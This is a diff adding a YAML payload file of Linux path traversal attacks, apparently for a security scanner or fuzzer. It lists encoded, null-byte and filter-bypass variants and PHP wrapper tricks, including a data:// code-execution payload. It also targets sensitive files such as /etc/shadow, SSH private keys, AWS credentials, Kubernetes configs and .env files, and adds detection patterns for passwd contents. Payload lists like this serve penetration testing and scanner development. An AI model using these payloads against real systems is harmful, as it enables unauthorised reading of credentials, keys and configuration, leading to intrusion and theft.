@@ -1,0 +1,541 @@
+metadata:
+  type: traversal/linux
+  version: "1.0"
+  description: "Linux path traversal payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "root:.*?:0:0:"
+  - "daemon:.*?:1:1:"
+
+payloads:
+  basic:
+    - value: "../../../etc/passwd"
+      description: "Basic Linux path traversal"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../etc/passwd"
+      description: "4 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../../etc/passwd"
+      description: "5 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../../../etc/passwd"
+      description: "6 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../../../../etc/passwd"
+      description: "7 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../../../../../etc/passwd"
+      description: "8 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../../../../../../etc/passwd"
+      description: "9 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "../../../../../../../../../../etc/passwd"
+      description: "10 levels up"
+      severity: critical
+      tags: [basic, linux]
+
+    - value: "....//etc/passwd"
+      description: "Double dot slash bypass"
+      severity: critical
+      tags: [basic, bypass]
+
+    - value: "....//....//etc/passwd"
+      description: "Double dot slash 2 levels"
+      severity: critical
+      tags: [basic, bypass]
+
+    - value: "....//....//....//etc/passwd"
+      description: "Double dot slash 3 levels"
+      severity: critical
+      tags: [basic, bypass]
+
+    - value: "..../..../etc/passwd"
+      description: "4 dots slash bypass"
+      severity: critical
+      tags: [basic, bypass]
+
+    - value: "/etc/passwd"
+      description: "Absolute path"
+      severity: critical
+      tags: [basic, absolute]
+
+    - value: "etc/passwd"
+      description: "Relative path no dots"
+      severity: high
+      tags: [basic]
+
+    - value: "./etc/passwd"
+      description: "Current dir relative"
+      severity: high
+      tags: [basic]
+
+  encoded:
+    - value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      description: "URL encoded ../"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      description: "Partial URL encoded"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "..%2f..%2f..%2fetc%2fpasswd"
+      description: "Slash URL encoded"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd"
+      description: "Backslash URL encoded"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "..%252f..%252f..%252fetc%252fpasswd"
+      description: "Double URL encoded"
+      severity: critical
+      tags: [encoded, double_url]
+
+    - value: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      description: "Full double URL encoded"
+      severity: critical
+      tags: [encoded, double_url]
+
+    - value: "..%255c..%255c..%255cetc%255cpasswd"
+      description: "Double encoded backslash"
+      severity: critical
+      tags: [encoded, double_url]
+
+    - value: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      description: "UTF-8 overlong %c0%af"
+      severity: critical
+      tags: [encoded, utf8_overlong]
+
+    - value: "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
+      description: "UTF-8 overlong %c1%9c"
+      severity: critical
+      tags: [encoded, utf8_overlong]
+
+    - value: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
+      description: "Fullwidth slash"
+      severity: critical
+      tags: [encoded, fullwidth]
+
+    - value: "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd"
+      description: "Unicode %u encoding"
+      severity: critical
+      tags: [encoded, unicode]
+
+    - value: "..\\/..\\/..\\/etc\\/passwd"
+      description: "Backslash encoded"
+      severity: critical
+      tags: [encoded, backslash]
+
+    - value: "..%00/..%00/..%00/etc/passwd"
+      description: "Null byte between dots"
+      severity: critical
+      tags: [encoded, null_byte]
+
+    - value: "..%0d%0a/..%0d%0a/..%0d%0a/etc/passwd"
+      description: "CRLF between dots"
+      severity: critical
+      tags: [encoded, crlf]
+
+  null_byte:
+    - value: "../../../etc/passwd%00"
+      description: "Null byte termination"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.png"
+      description: "Null byte with extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.jpg"
+      description: "Null byte jpg extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.html"
+      description: "Null byte html extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.php"
+      description: "Null byte php extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.txt"
+      description: "Null byte txt extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.css"
+      description: "Null byte css extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%00.js"
+      description: "Null byte js extension"
+      severity: critical
+      tags: [null_byte]
+
+    - value: "../../../etc/passwd%2500"
+      description: "Double encoded null byte"
+      severity: critical
+      tags: [null_byte, double_encode]
+
+    - value: "../../../etc/passwd%u0000"
+      description: "Unicode null byte"
+      severity: critical
+      tags: [null_byte, unicode]
+
+  filter_bypass:
+    - value: "..;/etc/passwd"
+      description: "Semicolon bypass"
+      severity: critical
+      tags: [filter_bypass, semicolon]
+
+    - value: "..;/..;/..;/etc/passwd"
+      description: "Semicolon multi-level"
+      severity: critical
+      tags: [filter_bypass, semicolon]
+
+    - value: "/../../../etc/passwd"
+      description: "Leading slash"
+      severity: critical
+      tags: [filter_bypass, leading_slash]
+
+    - value: "///../../../etc/passwd"
+      description: "Triple leading slash"
+      severity: critical
+      tags: [filter_bypass, leading_slash]
+
+    - value: "/..;/..;/..;/etc/passwd"
+      description: "Semicolon with leading slash"
+      severity: critical
+      tags: [filter_bypass, semicolon]
+
+    - value: "..%00/etc/passwd"
+      description: "Null byte in path"
+      severity: critical
+      tags: [filter_bypass, null_byte]
+
+    - value: "..%0d/etc/passwd"
+      description: "CR in path"
+      severity: critical
+      tags: [filter_bypass, cr]
+
+    - value: "..%0a/etc/passwd"
+      description: "LF in path"
+      severity: critical
+      tags: [filter_bypass, lf]
+
+    - value: "..%0d%0a/etc/passwd"
+      description: "CRLF in path"
+      severity: critical
+      tags: [filter_bypass, crlf]
+
+    - value: "..\\..\\..\\etc\\passwd"
+      description: "Backslash traversal"
+      severity: critical
+      tags: [filter_bypass, backslash]
+
+    - value: "..\\..\\..\\etc/passwd"
+      description: "Mixed slash traversal"
+      severity: critical
+      tags: [filter_bypass, mixed_slash]
+
+    - value: "....//etc/passwd"
+      description: "Double dot double slash"
+      severity: critical
+      tags: [filter_bypass, double_dot]
+
+    - value: "..//////etc/passwd"
+      description: "Multiple slashes"
+      severity: critical
+      tags: [filter_bypass, multi_slash]
+
+    - value: "..///..///..///etc/passwd"
+      description: "Triple slash per level"
+      severity: critical
+      tags: [filter_bypass, multi_slash]
+
+    - value: "/etc/passwd/.."
+      description: "Trailing .. bypass"
+      severity: high
+      tags: [filter_bypass, trailing]
+
+    - value: "/etc/passwd%00"
+      description: "Null byte at end"
+      severity: critical
+      tags: [filter_bypass, null_byte]
+
+    - value: "/etc/passwd%00.jpg"
+      description: "Null byte with fake extension"
+      severity: critical
+      tags: [filter_bypass, null_byte]
+
+    - value: "/etc/passwd#"
+      description: "Fragment bypass"
+      severity: high
+      tags: [filter_bypass, fragment]
+
+    - value: "/etc/passwd?"
+      description: "Query bypass"
+      severity: high
+      tags: [filter_bypass, query]
+
+    - value: "/etc/passwd%20"
+      description: "Space bypass"
+      severity: high
+      tags: [filter_bypass, space]
+
+    - value: "/etc/passwd%09"
+      description: "Tab bypass"
+      severity: high
+      tags: [filter_bypass, tab]
+
+  specific_files:
+    - value: "../../../etc/shadow"
+      description: "Read shadow file"
+      severity: critical
+      tags: [file, shadow]
+
+    - value: "../../../etc/hosts"
+      description: "Read hosts file"
+      severity: high
+      tags: [file, hosts]
+
+    - value: "../../../etc/hostname"
+      description: "Read hostname"
+      severity: high
+      tags: [file, hostname]
+
+    - value: "../../../etc/issue"
+      description: "Read OS version"
+      severity: high
+      tags: [file, issue]
+
+    - value: "../../../etc/group"
+      description: "Read group file"
+      severity: high
+      tags: [file, group]
+
+    - value: "../../../etc/ssh/sshd_config"
+      description: "Read SSH config"
+      severity: high
+      tags: [file, ssh]
+
+    - value: "../../../proc/version"
+      description: "Read kernel version"
+      severity: high
+      tags: [file, proc]
+
+    - value: "../../../proc/self/environ"
+      description: "Read process env"
+      severity: critical
+      tags: [file, proc, env]
+
+    - value: "../../../proc/self/cmdline"
+      description: "Read process cmdline"
+      severity: high
+      tags: [file, proc]
+
+    - value: "../../../proc/self/status"
+      description: "Read process status"
+      severity: medium
+      tags: [file, proc]
+
+    - value: "../../../proc/net/tcp"
+      description: "Read TCP connections"
+      severity: high
+      tags: [file, proc, network]
+
+    - value: "../../../proc/net/arp"
+      description: "Read ARP table"
+      severity: high
+      tags: [file, proc, network]
+
+    - value: "../../../proc/mounts"
+      description: "Read mounts"
+      severity: high
+      tags: [file, proc]
+
+    - value: "../../../var/log/apache2/access.log"
+      description: "Read Apache log"
+      severity: high
+      tags: [file, log]
+
+    - value: "../../../var/log/nginx/access.log"
+      description: "Read Nginx log"
+      severity: high
+      tags: [file, log]
+
+    - value: "../../../var/log/auth.log"
+      description: "Read auth log"
+      severity: high
+      tags: [file, log]
+
+    - value: "../../../var/log/syslog"
+      description: "Read syslog"
+      severity: high
+      tags: [file, log]
+
+    - value: "../../../var/www/html/.env"
+      description: "Read .env"
+      severity: critical
+      tags: [file, config]
+
+    - value: "../../../var/www/html/wp-config.php"
+      description: "Read WordPress config"
+      severity: critical
+      tags: [file, config]
+
+    - value: "../../../home/user/.ssh/id_rsa"
+      description: "Read SSH key"
+      severity: critical
+      tags: [file, ssh_key]
+
+    - value: "../../../home/user/.bash_history"
+      description: "Read bash history"
+      severity: high
+      tags: [file, history]
+
+    - value: "../../../root/.ssh/id_rsa"
+      description: "Read root SSH key"
+      severity: critical
+      tags: [file, ssh_key]
+
+    - value: "../../../root/.bash_history"
+      description: "Read root history"
+      severity: high
+      tags: [file, history]
+
+    - value: "../../../root/.aws/credentials"
+      description: "Read AWS credentials"
+      severity: critical
+      tags: [file, cloud]
+
+    - value: "../../../root/.kube/config"
+      description: "Read Kubernetes config"
+      severity: critical
+      tags: [file, cloud]
+
+    - value: "../../../etc/mysql/my.cnf"
+      description: "Read MySQL config"
+      severity: high
+      tags: [file, config]
+
+    - value: "../../../etc/redis/redis.conf"
+      description: "Read Redis config"
+      severity: high
+      tags: [file, config]
+
+    - value: "../../../etc/httpd/conf/httpd.conf"
+      description: "Read Apache config"
+      severity: high
+      tags: [file, config]
+
+    - value: "../../../etc/nginx/nginx.conf"
+      description: "Read Nginx config"
+      severity: high
+      tags: [file, config]
+
+  wrapper_based:
+    - value: "php://filter/convert.base64-encode/resource=../../../etc/passwd"
+      description: "PHP filter base64"
+      severity: critical
+      tags: [wrapper, php, base64]
+
+    - value: "php://filter/convert.base64-encode/resource=../../../var/www/html/index.php"
+      description: "PHP filter source code"
+      severity: critical
+      tags: [wrapper, php, base64]
+
+    - value: "php://filter/convert.base64-encode/resource=../../../var/www/html/config.php"
+      description: "PHP filter config"
+      severity: critical
+      tags: [wrapper, php, base64]
+
+    - value: "php://filter/convert.base64-encode/resource=../../../etc/shadow"
+      description: "PHP filter shadow"
+      severity: critical
+      tags: [wrapper, php, base64]
+
+    - value: "php://filter/convert.base64-encode/resource=../../../var/www/html/wp-config.php"
+      description: "PHP filter WordPress"
+      severity: critical
+      tags: [wrapper, php, base64]
+
+    - value: "php://filter/convert.base64-encode/resource=../config.php"
+      description: "PHP filter relative config"
+      severity: critical
+      tags: [wrapper, php, base64]
+
+    - value: "data://text/plain;base64,SSBsb3ZlIFBIUAo="
+      description: "PHP data wrapper"
+      severity: high
+      tags: [wrapper, php, data]
+
+    - value: "data://text/plain,<?php phpinfo()?>"
+      description: "PHP data code execution"
+      severity: critical
+      tags: [wrapper, php, data, rce]
+
+    - value: "zip://file.zip#file.txt"
+      description: "PHP zip wrapper"
+      severity: high
+      tags: [wrapper, php, zip]
+
+    - value: "phar://file.phar/test.txt"
+      description: "PHP phar wrapper"
+      severity: high
+      tags: [wrapper, php, phar]
+
+    - value: "compress.zlib:///etc/passwd"
+      description: "PHP compress.zlib"
+      severity: high
+      tags: [wrapper, php, compress]
+
+    - value: "compress.bzip2:///etc/passwd"
+      description: "PHP compress.bzip2"
+      severity: high
+      tags: [wrapper, php, compress]
+
+    - value: "glob:///etc/passwd"
+      description: "PHP glob wrapper"
+      severity: medium
+      tags: [wrapper, php, glob]
+
+    - value: "ogg:///etc/passwd"
+      description: "PHP ogg wrapper"
+      severity: high
+      tags: [wrapper, php, ogg]
+
+    - value: "file:///etc/passwd"
+      description: "File protocol"
+      severity: critical
+      tags: [wrapper, file]
+
+    - value: "file:///etc/shadow"
+      description: "File protocol shadow"
+      severity: critical
+      tags: [wrapper, file]
